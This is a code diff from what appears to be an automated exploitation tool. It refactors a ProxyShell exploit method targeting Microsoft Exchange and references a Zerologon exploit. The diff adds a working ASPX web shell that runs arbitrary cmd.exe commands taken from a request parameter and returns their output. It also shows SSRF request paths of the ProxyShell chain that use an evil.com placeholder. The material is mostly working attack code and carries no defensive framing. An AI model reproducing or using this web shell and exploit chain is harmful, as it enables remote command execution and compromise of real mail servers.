@@ -1082,6 +1082,19 @@ exploit_zerologon("{target.ip}", "DC")
     def _exploit_proxyshell(self, target: Target, vuln: Vulnerability) -> Optional[Dict]:
         """Exploit ProxyShell"""
         
+        shell_content = """<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<% 
+    string cmd = Request["cmd"];
+    Process p = new Process();
+    p.StartInfo.FileName = "cmd.exe";
+    p.StartInfo.Arguments = "/c " + cmd;
+    p.StartInfo.RedirectStandardOutput = true;
+    p.StartInfo.UseShellExecute = false;
+    p.Start();
+    Response.Write(p.StandardOutput.ReadToEnd());
+%>"""
+        
         exploit_code = f'''
 # ProxyShell Exploitation
 # Full chain: CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207
@@ -1096,21 +1109,7 @@ ssrf_url = f"https://{{target}}/autodiscover/autodiscover.json?@evil.com/mapi/ns
 
 # 2. Get PowerShell web shell
 # Using CVE-2021-31207 to write aspx shell
-
-shell_content = '''
-<%@ Page Language="C#" %>
-<%@ Import Namespace="System.Diagnostics" %>
-<% 
-    string cmd = Request["cmd"];
-    Process p = new Process();
-    p.StartInfo.FileName = "cmd.exe";
-    p.StartInfo.Arguments = "/c " + cmd;
-    p.StartInfo.RedirectStandardOutput = true;
-    p.StartInfo.UseShellExecute = false;
-    p.Start();
-    Response.Write(p.StandardOutput.ReadToEnd());
-%>
-'''
+# Shell content defined separately
 
 # 3. Trigger shell write via draft email
 # POST /autodiscover/autodiscover.json?@evil.com/EWS/exchange.asmx/?&Email=autodiscover/autodiscover.json%3F@evil.com
